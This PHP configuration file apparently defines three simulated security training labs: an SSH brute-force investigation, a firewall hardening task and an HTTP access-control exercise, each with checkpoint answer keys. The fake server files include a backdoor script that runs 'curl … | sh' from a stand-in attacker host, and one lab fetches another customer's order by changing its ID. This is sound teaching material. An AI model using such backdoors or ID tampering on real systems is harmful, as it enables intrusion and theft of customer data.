<?php

/*
 * Practical labs (ARCHITECTURE §7, D28), loaded by Labs\Services\LabLoader. Keyed by slug, in
 * the order offered. Each names a server-side engine and a scenario; checkpoint answers and
 * hidden test packets stay on the server. Engines and scenario formats:
 * app/Modules/Labs/Engines. Everything here is simulated: no command runs and no request
 * leaves the server.
 */

// An overnight SSH brute force against web-01, then a login and a scheduled backdoor.
$auth = [];
$second = 0;
$time = function () use (&$second): string {
    $t = 2 * 3600 + 41 * 60 + $second;

    return sprintf('Nov 20 %02d:%02d:%02d', intdiv($t, 3600), intdiv($t, 60) % 60, $t % 60);
};
foreach (['admin', 'root', 'test', 'oracle', 'admin', 'ubuntu', 'deploy', 'root', 'git', 'deploy', 'admin', 'postgres', 'deploy', 'root', 'test', 'deploy', 'jenkins', 'admin', 'deploy', 'root', 'ftp', 'deploy', 'admin', 'deploy'] as $i => $user) {
    $second += 37;
    $known = in_array($user, ['root', 'deploy'], true);
    $auth[] = $time().' web-01 sshd['.(2301 + $i).']: Failed password for '.($known ? '' : 'invalid user ').$user.' from 203.0.113.77 port '.(40112 + $i * 3).' ssh2';
    if ($i === 9) {
        $auth[] = $time().' web-01 sshd[2330]: Failed password for mai from 198.51.100.23 port 52011 ssh2';
        $auth[] = $time().' web-01 sshd[2331]: Accepted password for mai from 198.51.100.23 port 52014 ssh2';
    }
}
$second += 41;
$auth[] = $time().' web-01 sshd[2412]: Accepted password for deploy from 203.0.113.77 port 51544 ssh2';
$second += 12;
$auth[] = $time().' web-01 sshd[2412]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)';
$second += 95;
$auth[] = $time().' web-01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/crontab -e';
$second += 240;
$auth[] = $time().' web-01 sshd[2412]: pam_unix(sshd:session): session closed for user deploy';

return [
    'investigate-a-suspicious-login' => [
        'title' => 'Investigate a suspicious login',
        'summary' => 'Read a server\'s logs from the shell to find who broke in overnight, from where, and what they left behind.',
        'briefing' => <<<'MD'
The web team noticed a burst of failed SSH logins on **web-01** overnight, followed by one that succeeded. You have a read-only shell on the server. Work out who got in, from where, and what they changed.

Start with `cat notes.txt`. The commands you know from the lesson work here: `ls`, `cd`, `cat`, `grep`, `wc`, `sort`, `uniq`, `cut`, `head`, `tail` and `find`, and `|` passes one command's output to the next. Type `help` for the full list.

Everything here is simulated: nothing you type runs on a real system.
MD,
        'domain' => 'linux',
        'lesson' => 'linux-logs',
        'engine' => 'linux-shell',
        'difficulty' => 1,
        'estimated_minutes' => 25,
        'scenario' => [
            'hostname' => 'web-01',
            'user' => 'analyst',
            'home' => '/home/analyst',
            'cwd' => '/home/analyst',
            'files' => [
                '/home/analyst/notes.txt' => "Ticket SEC-142\nA burst of failed SSH logins hit web-01 overnight, then one succeeded.\nFind out who got in, from where, and what they did.\nThe logs are under /var/log.\n",
                '/var/log/auth.log' => implode("\n", $auth)."\n",
                '/var/log/syslog' => implode("\n", [
                    'Nov 20 02:30:01 web-01 CRON[2201]: (root) CMD (/usr/lib/php/sessionclean)',
                    'Nov 20 02:58:31 web-01 crontab[2420]: (root) REPLACE (root)',
                    'Nov 20 03:00:01 web-01 CRON[2431]: (root) CMD (/usr/lib/php/sessionclean)',
                    'Nov 20 03:00:01 web-01 CRON[2432]: (root) CMD (/tmp/.cache/update.sh)',
                    'Nov 20 03:05:01 web-01 CRON[2447]: (root) CMD (/tmp/.cache/update.sh)',
                    'Nov 20 03:10:01 web-01 CRON[2459]: (root) CMD (/tmp/.cache/update.sh)',
                ])."\n",
                '/home/deploy/.bash_history' => "ls -la\nwget http://203.0.113.77/update.sh -O /tmp/.cache/update.sh\nchmod +x /tmp/.cache/update.sh\nsudo crontab -e\nhistory -c\n",
                '/tmp/.cache/update.sh' => "#!/bin/sh\n# runs every five minutes from root's crontab\ncurl -s http://203.0.113.77/task | sh\n",
                '/etc/hostname' => "web-01\n",
                '/etc/passwd' => "root:x:0:0:root:/root:/bin/bash\ndeploy:x:1001:1001:Deploy user:/home/deploy:/bin/bash\nmai:x:1002:1002:Mai Nguyen:/home/mai:/bin/bash\nanalyst:x:1000:1000:Analyst:/home/analyst:/bin/bash\n",
            ],
            'dirs' => ['/home/mai', '/root'],
            'checkpoints' => [
                ['id' => 'read-auth-log', 'kind' => 'read', 'path' => '/var/log/auth.log', 'title' => 'Open the authentication log, /var/log/auth.log.', 'hint' => 'Try cd /var/log, then ls, then cat or head on the file.'],
                ['id' => 'attacker-ip', 'kind' => 'answer', 'answers' => ['203.0.113.77'], 'title' => 'Which IP address made the failed attempts and then logged in?', 'hint' => 'grep "Accepted" shows every successful login. Which source also appears in the failures?'],
                ['id' => 'account', 'kind' => 'answer', 'answers' => ['deploy'], 'title' => 'Which account did the attacker log in as?', 'hint' => 'Read the "Accepted password for …" line for that address.'],
                ['id' => 'failure-count', 'kind' => 'answer', 'answers' => ['24'], 'title' => 'How many failed password attempts came from that address?', 'hint' => 'Chain two filters: grep the address, pipe into grep -c "Failed password".'],
                ['id' => 'backdoor', 'kind' => 'answer', 'answers' => ['/tmp/.cache/update.sh'], 'title' => 'Which file did the attacker schedule to run? Give its full path.', 'hint' => 'The attacker edited root\'s crontab. Look for what CRON started afterwards in /var/log/syslog.'],
            ],
        ],
    ],

    'lock-down-a-web-server' => [
        'title' => 'Lock down a web server\'s firewall',
        'summary' => 'Turn a permissive rule list into one that serves the website, keeps SSH for admins only and refuses everything else.',
        'briefing' => <<<'MD'
**web-01** (10.0.20.10) runs the public website. Its firewall allows far too much: anyone can reach SSH, and everything not listed is allowed by default.

Rewrite the rules so the server does its job and nothing more. Rules are checked from the top; the first rule that matches a packet decides, and the default policy handles anything no rule matches. Use **Test a packet** to check your rules before you rely on them. The admin network is 10.0.10.0/24.

Everything here is simulated: no traffic is sent anywhere.
MD,
        'domain' => 'system-administration',
        'lesson' => 'hardening-basics',
        'engine' => 'firewall-rules',
        'difficulty' => 2,
        'estimated_minutes' => 20,
        'scenario' => [
            'server' => ['name' => 'web-01', 'ip' => '10.0.20.10'],
            'default' => 'allow',
            'rules' => [
                ['action' => 'allow', 'proto' => 'tcp', 'port' => 22, 'source' => 'any'],
                ['action' => 'allow', 'proto' => 'tcp', 'port' => 80, 'source' => 'any'],
            ],
            'checkpoints' => [
                ['id' => 'https-open', 'kind' => 'traffic', 'title' => 'Visitors anywhere can reach the website over HTTPS (TCP 443).', 'packets' => [
                    ['proto' => 'tcp', 'port' => 443, 'source' => '198.51.100.7', 'expect' => 'allow'],
                    ['proto' => 'tcp', 'port' => 443, 'source' => '10.0.10.25', 'expect' => 'allow'],
                ]],
                ['id' => 'http-redirect', 'kind' => 'traffic', 'title' => 'Plain HTTP (TCP 80) still answers, so it can send visitors to HTTPS.', 'packets' => [
                    ['proto' => 'tcp', 'port' => 80, 'source' => '203.0.113.9', 'expect' => 'allow'],
                ]],
                ['id' => 'ssh-admins-only', 'kind' => 'traffic', 'title' => 'SSH (TCP 22) works from the admin network 10.0.10.0/24 and nowhere else.', 'hint' => 'An allow rule for the admin network has to come before anything that would refuse SSH.', 'packets' => [
                    ['proto' => 'tcp', 'port' => 22, 'source' => '10.0.10.25', 'expect' => 'allow'],
                    ['proto' => 'tcp', 'port' => 22, 'source' => '203.0.113.50', 'expect' => 'deny'],
                    ['proto' => 'tcp', 'port' => 22, 'source' => '10.0.20.30', 'expect' => 'deny'],
                ]],
                ['id' => 'rest-refused', 'kind' => 'traffic', 'title' => 'Everything else is refused, including the database port and services on the admin network.', 'hint' => 'Think about what happens to a packet that no rule matches.', 'packets' => [
                    ['proto' => 'tcp', 'port' => 3306, 'source' => '203.0.113.9', 'expect' => 'deny'],
                    ['proto' => 'udp', 'port' => 161, 'source' => '10.0.10.25', 'expect' => 'deny'],
                    ['proto' => 'tcp', 'port' => 8080, 'source' => '10.0.10.25', 'expect' => 'deny'],
                ]],
                ['id' => 'default-policy', 'kind' => 'answer', 'answers' => ['deny', 'default deny', 'deny all', 'block', 'drop'], 'title' => 'In one word: what default policy should a server\'s inbound firewall use?'],
            ],
        ],
    ],

    'inspect-a-shop-session' => [
        'title' => 'Inspect an online shop\'s session',
        'summary' => 'Read recorded HTTP traffic, spot what the responses give away, and replay a request to find a broken access check.',
        'briefing' => <<<'MD'
You have an account at **Mini Shop**, a small online store, and you are allowed to test it. Below are the requests your browser made when you signed in and opened your order. Read the headers, then send your own requests with your session cookie and see how the shop answers.

Everything here is simulated: requests go to a practice copy of the shop inside this lab, never to the internet. Only ever test sites you have permission to test.
MD,
        'domain' => 'web-security',
        'lesson' => 'http-essentials',
        'engine' => 'http-inspector',
        'difficulty' => 2,
        'estimated_minutes' => 25,
        'scenario' => [
            'app' => ['name' => 'Mini Shop', 'origin' => 'https://shop.example'],
            'session' => ['name' => 'session', 'value' => 'u-4821-7f3a9c'],
            'captured' => [
                [
                    'request' => ['method' => 'POST', 'path' => '/login', 'headers' => ['Content-Type' => 'application/x-www-form-urlencoded'], 'body' => 'email=you%40shop.example&password=********'],
                    'response' => ['status' => 302, 'headers' => ['Server' => 'Apache/2.4.49 (Unix)', 'Location' => '/account', 'Set-Cookie' => 'session=u-4821-7f3a9c; Path=/; Secure; SameSite=Lax'], 'body' => ''],
                ],
                [
                    'request' => ['method' => 'GET', 'path' => '/api/orders/1001', 'headers' => ['Cookie' => 'session=u-4821-7f3a9c', 'Accept' => 'application/json'], 'body' => ''],
                    'response' => ['status' => 200, 'headers' => ['Server' => 'Apache/2.4.49 (Unix)', 'Content-Type' => 'application/json'], 'body' => '{"id":1001,"customer":"you@shop.example","total":"24.90","items":["USB-C cable","Laptop stand"]}'],
                ],
            ],
            'routes' => [
                ['id' => 'own-order', 'method' => 'GET', 'path' => '/api/orders/1001', 'cookie' => ['name' => 'session', 'value' => 'u-4821-7f3a9c'],
                    'response' => ['status' => 200, 'headers' => ['Content-Type' => 'application/json'], 'body' => '{"id":1001,"customer":"you@shop.example","total":"24.90","items":["USB-C cable","Laptop stand"]}']],
                ['id' => 'order-1002', 'method' => 'GET', 'path' => '/api/orders/1002', 'cookie' => ['name' => 'session', 'value' => 'u-4821-7f3a9c'],
                    'response' => ['status' => 200, 'headers' => ['Content-Type' => 'application/json'], 'body' => '{"id":1002,"customer":"minh.tran@shop.example","total":"310.00","address":"12 Le Loi, District 1","items":["Mechanical keyboard","27-inch monitor"]}']],
                ['id' => 'order-1003', 'method' => 'GET', 'path' => '/api/orders/1003', 'cookie' => ['name' => 'session', 'value' => 'u-4821-7f3a9c'],
                    'response' => ['status' => 200, 'headers' => ['Content-Type' => 'application/json'], 'body' => '{"id":1003,"customer":"thao.le@shop.example","total":"58.40","items":["Webcam"]}']],
                ['id' => 'my-orders', 'method' => 'GET', 'path' => '/api/orders', 'cookie' => ['name' => 'session', 'value' => 'u-4821-7f3a9c'],
                    'response' => ['status' => 200, 'headers' => ['Content-Type' => 'application/json'], 'body' => '[{"id":1001,"total":"24.90"}]']],
                ['id' => 'account', 'method' => 'GET', 'path' => '/account', 'cookie' => ['name' => 'session', 'value' => 'u-4821-7f3a9c'],
                    'response' => ['status' => 200, 'headers' => ['Content-Type' => 'text/html'], 'body' => '<h1>Your account</h1><p>Signed in as you@shop.example</p>']],
                ['id' => 'admin', 'method' => 'GET', 'path' => '/admin',
                    'response' => ['status' => 403, 'headers' => ['Content-Type' => 'text/plain'], 'body' => 'Forbidden']],
            ],
            'checkpoints' => [
                ['id' => 'missing-flag', 'kind' => 'answer', 'answers' => ['HttpOnly', 'Http-Only', 'Http Only'], 'title' => 'Which attribute is missing from the session cookie, so scripts on the page could read it?', 'hint' => 'Compare the Set-Cookie header on the login response with the cookie attributes from the lesson.'],
                ['id' => 'server-version', 'kind' => 'answer', 'answers' => ['Apache/2.4.49', 'Apache 2.4.49', 'Apache/2.4.49 (Unix)', '2.4.49'], 'title' => 'Which web server software and version does the shop reveal in its responses?'],
                ['id' => 'other-order', 'kind' => 'request', 'route' => 'order-1002', 'title' => 'With your own session, fetch an order that is not yours.', 'hint' => 'Your order is /api/orders/1001. What does the shop do if you change the number?'],
                ['id' => 'whose-order', 'kind' => 'answer', 'answers' => ['minh.tran@shop.example'], 'title' => 'Whose order is 1002? Give the customer\'s email address.'],
            ],
            'not_found' => ['status' => 404, 'headers' => ['Content-Type' => 'text/plain'], 'body' => 'Not Found'],
        ],
    ],
];
